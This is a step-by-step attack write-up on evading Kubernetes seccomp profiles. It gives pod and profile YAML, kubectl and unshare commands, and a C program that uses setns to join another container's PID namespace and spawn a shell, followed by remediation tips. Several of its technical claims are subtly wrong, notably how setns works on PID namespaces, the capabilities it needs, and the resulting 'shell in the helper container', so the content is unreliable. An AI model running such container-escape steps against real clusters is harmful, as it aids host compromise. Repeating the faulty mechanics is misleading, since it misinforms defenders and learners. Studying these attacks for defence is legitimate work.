# Kubernetes Seccomp Profile Bypass and Evasion

## 1. Overview

**Attack Vector Description:**

This vulnerability allows an attacker to bypass and evade the seccomp (secure computing mode) profile configured for a Kubernetes pod. Seccomp profiles are designed to restrict the syscalls a container process can make, thereby limiting the potential attack surface. A bypass allows a malicious container to execute syscalls that are supposedly blocked, potentially leading to container escape, privilege escalation, and host compromise.

**Potential Impact and Consequences:**

*   **Container Escape:** The attacker can leverage the bypass to perform syscalls necessary to break out of the container isolation and gain access to the underlying host system.
*   **Privilege Escalation:**  Even without a full container escape, access to restricted syscalls can be used to escalate privileges within the container environment itself.  For instance, bypassing seccomp allows for direct memory manipulation, potentially injecting malicious code into other processes running in the container.
*   **Host Compromise:** If container escape is achieved, the attacker can potentially compromise the entire host machine and other containers running on it.
*   **Data Exfiltration/Manipulation:**  Gaining access to unrestricted syscalls facilitates the exfiltration of sensitive data or the manipulation of critical system files.
*   **Denial of Service (DoS):** Malicious syscalls could be used to crash the node or other containers.

**Risk Level Assessment:**

*   **Critical:**  Successful bypass allows for complete control of the host, making this a critical vulnerability.

**Technical Explanation:**

Seccomp profiles work by defining a whitelist or blacklist of system calls that a container is allowed or disallowed to execute. Bypass vulnerabilities arise due to several reasons:

*   **Incomplete Profile:** The seccomp profile may not block all the necessary system calls for complete security.  Attackers often look for "gadgets" – short sequences of allowed syscalls that can be combined to achieve malicious outcomes equivalent to forbidden syscalls.
*   **Profile Misconfiguration:**  The seccomp profile might be incorrectly configured, allowing unintended syscalls.
*   **Kernel Bugs:**  Underlying kernel vulnerabilities might allow bypassing the seccomp filtering mechanism itself.
*   **Use of `unconfined` Profile:**  If a pod is deployed with the `unconfined` seccomp profile, no restrictions are applied, effectively disabling seccomp.

**Prerequisites and Conditions Needed:**

*   **Deployed Kubernetes Cluster:** Access to a running Kubernetes cluster is essential.
*   **Permission to Deploy Pods:** The attacker needs the ability to deploy pods with their own configuration (including securityContext and seccompProfile).
*   **Basic Understanding of Seccomp and Kubernetes:** Familiarity with seccomp profiles and Kubernetes security context configurations is crucial.
*   **Vulnerable Seccomp Profile (or Misconfiguration):** The target seccomp profile needs to have weaknesses or be misconfigured to allow the bypass. A target profile is needed to validate that the syscall is truly blocked.
*   **Target Application inside Container:** A target application inside the container that is impacted by the seccomp restrictions is required.  This application is what is ultimately being exploited.
*   **Tools:** `kubectl` (or similar Kubernetes CLI tool) for interacting with the cluster, and potentially tools like `strace` within the container to observe syscall behavior.

## 2. Validation and Exploitation Steps

This example focuses on validating the seccomp profile restrictions and then attempts a bypass. We will assume a scenario where the `clone` syscall is supposed to be blocked by a custom seccomp profile.

**Step 1: Create a Test Pod and a Custom Seccomp Profile**

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: seccomp-test-pod
spec:
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: seccomp-profile.json
  containers:
  - name: test-container
    image: ubuntu:latest
    command: ["/bin/bash", "-c", "sleep infinity"]
    securityContext:
      allowPrivilegeEscalation: false
      capabilities:
        drop: ["ALL"]
    volumeMounts:
      - name: seccomp-profiles
        mountPath: /seccomp-profiles
  volumes:
    - name: seccomp-profiles
      configMap:
        name: seccomp-profiles
```

Explanation:
- This YAML defines a simple pod.
- `seccompProfile` specifies that the pod should use a seccomp profile stored locally within a configmap called `seccomp-profiles`.
- The container runs a basic `ubuntu:latest` image and sleeps indefinitely.
- `allowPrivilegeEscalation: false` and `capabilities: drop: ["ALL"]` reduce the potential for easy container escape techniques.
- A volume mount allows accessing the configmap containing the seccomp profile from inside the pod.

Next, create a basic seccomp profile that aims to block `clone`.

```json
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "syscalls": [
    {
      "names": ["clone"],
      "action": "SCMP_ACT_ERRNO",
      "errno": "EPERM"
    }
  ]
}
```

Explanation:
- `defaultAction: SCMP_ACT_ALLOW` allows all syscalls by default unless explicitly forbidden.
- The `syscalls` array specifies that the `clone` syscall should be blocked.
- `SCMP_ACT_ERRNO` returns an `EPERM` (Operation not permitted) error if the syscall is attempted.

Create a ConfigMap containing the seccomp profile:
```bash
kubectl create configmap seccomp-profiles --from-file=seccomp-profile.json=./seccomp-profile.json
```

Explanation:
- This command creates a Kubernetes ConfigMap named `seccomp-profiles`.
- `--from-file` tells `kubectl` to create the ConfigMap from the local file `seccomp-profile.json`.
- The key inside the ConfigMap will be `seccomp-profile.json`, which is referenced in the pod's YAML.

Finally, deploy the Pod:
```bash
kubectl apply -f pod.yaml
```

**Step 2: Verify Seccomp Profile is Active and Blocks `clone`**

First, get a shell inside the pod:
```bash
POD_NAME=$(kubectl get pods -l app=seccomp-test-pod -o jsonpath='{.items[0].metadata.name}')
kubectl exec -it $POD_NAME -- /bin/bash
```

Explanation:
- `kubectl get pods` retrieves the name of the pod created earlier.
- `-l app=seccomp-test-pod` filters the pods by the label `app=seccomp-test-pod`. (Add `app: seccomp-test-pod` to the pod metadata).
- `-o jsonpath='{.items[0].metadata.name}'` extracts the pod name from the JSON output.
- `kubectl exec -it` executes a command inside the container. In this case, it starts an interactive bash shell.

Now, try to execute `clone` indirectly (since direct syscalls are hard from a shell). One way to trigger `clone` is using `unshare`:

```bash
unshare --fork --pid --mount-proc
```

Explanation:
- `unshare` is a utility that allows unsharing parts of the process execution context, such as the process ID space, mount namespace, etc.
- `--fork` forks a new process (which utilizes `clone`).
- `--pid` creates a new PID namespace.
- `--mount-proc` mounts a procfs instance for the new PID namespace.

Expected Output:

If seccomp is blocking `clone` correctly, you should see an error message similar to:

```
unshare: unshare failed: Operation not permitted
```

If the `clone` syscall is *not* blocked, `unshare` will execute without error and you'll be in a new shell environment. This confirms the vulnerability: seccomp is not preventing the intended syscall. This is the Validation stage.

**Step 3:  Attempting a Seccomp Bypass (Example: Finding Alternative Sycalls)**

This is where finding a true bypass becomes highly specific to the application, kernel version, and seccomp profile's weaknesses.  A comprehensive approach requires reverse engineering the application's functionality and the seccomp profile.  We will illustrate a simple scenario where the attacker identifies alternative ways to achieve a similar outcome as `clone`.

One simplistic bypass, if only direct `clone` is blocked but `fork` or `vfork` are not, would be to use these alternative syscalls (which have slightly different semantics than `clone` but may still be sufficient). You could verify if they are blocked by running a simple C program within the container that attempts to call `fork`.

Suppose we can't call fork either and that other syscalls involving process creation are blocked as well.

**Step 4: Using `setns` (Hypothetical scenario – needs to be enabled and non-blocked)**

If `setns` is allowed, and if another container exists already that *can* perform the actions we require (e.g., is running with a less restrictive seccomp profile), then the attacker could use `setns` to join the namespaces of that container. This is a complex scenario requiring knowledge of other containers running on the same node.

First, let's assume another pod exists on the same node that *does* have the capability to create new processes (no seccomp restrictions, or a less restrictive profile).  We'll call it the "helper pod."

1.  **Find the helper pod's PID namespace:**

    Get a shell into the helper pod (using `kubectl exec -it`).  Then, inside the helper pod:

    ```bash
    PID=$(pidof <process_name_in_helper_pod>) # Replace <process_name_in_helper_pod> with the actual process name. For example `sleep` if a simple sleep process is running
    echo $PID
    NAMESPACE_PATH="/proc/$PID/ns/pid"
    echo $NAMESPACE_PATH
    ```

    This will print the path to the PID namespace file. It is usually `/proc/<pid>/ns/pid`.

2.  **Mount the Namespace (on the attacking container's side):**

    Back in the attacking container:

    ```bash
    mkdir /mnt/helper-ns
    mount --bind "$NAMESPACE_PATH" /mnt/helper-ns # ERROR, likely mount is blocked by the seccomp profile
    ```

    **Important:**  The `mount` command here will almost certainly be blocked by seccomp.  This illustrates a common scenario where the *direct* approach is blocked.

    *Alternative*: Instead of mounting the Namespace, find a way to read the namespace *without* the `mount` syscall if possible. Often reading the namespace from `/proc/$PID/ns/pid` will be possible even when `mount` is restricted.

    ```bash
    cat /proc/$(pidof sleep)/ns/pid # Replace `sleep` with the actual target process
    ```

    This is going to output a link, such as `pid:[4026531836]`.

    Next call `setns`. This allows the container to join an existing namespace, enabling process creation in the other namespaces (assuming there are no further restrictions after the namespace is entered).

    Before executing the setns call, verify which `setns` file descriptor is needed. The container must use the file descriptor for the namespace discovered in step 1:

    ```c
    #include <fcntl.h>
    #include <sched.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <unistd.h>

    int main(int argc, char *argv[]) {
        int fd;
        if (argc < 2) {
            fprintf(stderr, "Usage: %s <namespace_path>\n", argv[0]);
            exit(EXIT_FAILURE);
        }

        fd = open(argv[1], O_RDONLY);
        if (fd == -1) {
            perror("open");
            exit(EXIT_FAILURE);
        }

        if (setns(fd, 0) == -1) {
            perror("setns");
            close(fd);
            exit(EXIT_FAILURE);
        }

        close(fd);

        // Now in the target namespace. Try creating a new process.
        printf("Successfully entered namespace. Executing /bin/bash...\n");
        execl("/bin/bash", "/bin/bash", NULL);
        perror("execl"); // If execl fails
        exit(EXIT_FAILURE);

        return 0;
    }
    ```

    Compile and copy the executable into the container:

    ```bash
    gcc setns_example.c -o setns_example
    ```

    Run the program in the container referencing the namespace:

    ```bash
    ./setns_example  /proc/$(pidof sleep)/ns/pid # Replace sleep with the actual target process
    ```

    If `setns` is successful (not blocked by seccomp), this would execute `/bin/bash` *within* the target container's namespace. Effectively, you've bypassed the process creation restrictions by leveraging the capabilities of another container. You now have a shell in the helper container and thus have bypassed the seccomp profile.

**Step 5:  Exploitation (after Bypass)**

After successfully bypassing the seccomp restrictions, the attacker can proceed to exploit the system. This could involve:

*   Escaping the container.
*   Accessing sensitive data on the host.
*   Installing malware.
*   Launching denial-of-service attacks.

The specific exploitation steps will depend on the nature of the bypass and the overall target environment.

**Remediation Recommendations:**

*   **Use AppArmor or Seccomp:**  Enforce strict seccomp profiles, or AppArmor profiles when possible, for all containers in the cluster.
*   **Principle of Least Privilege:** Only grant containers the minimum necessary privileges and capabilities.
*   **Regularly Audit Profiles:** Regularly review and update seccomp and AppArmor profiles to ensure they remain effective against new threats.
*   **Kernel Updates:**  Keep the underlying kernel up-to-date to patch security vulnerabilities that might be exploited for seccomp bypass.
*   **Runtime Security Monitoring:** Implement runtime security monitoring tools to detect and respond to suspicious activity, including attempts to bypass seccomp profiles.
*   **Network Policies:** Restrict network access for containers to only the necessary services.
*   **Capability Dropping:** Drop all unnecessary Linux capabilities using the `securityContext` of your pod specification.
*   **Immutable Filesystems:** Mount root file systems and other sensitive directories as read-only where possible.

**Conclusion:**

Seccomp profile bypass and evasion represent a significant security risk in Kubernetes environments.  A layered security approach, including strong seccomp profiles, kernel hardening, and runtime security monitoring, is essential to mitigate this threat.
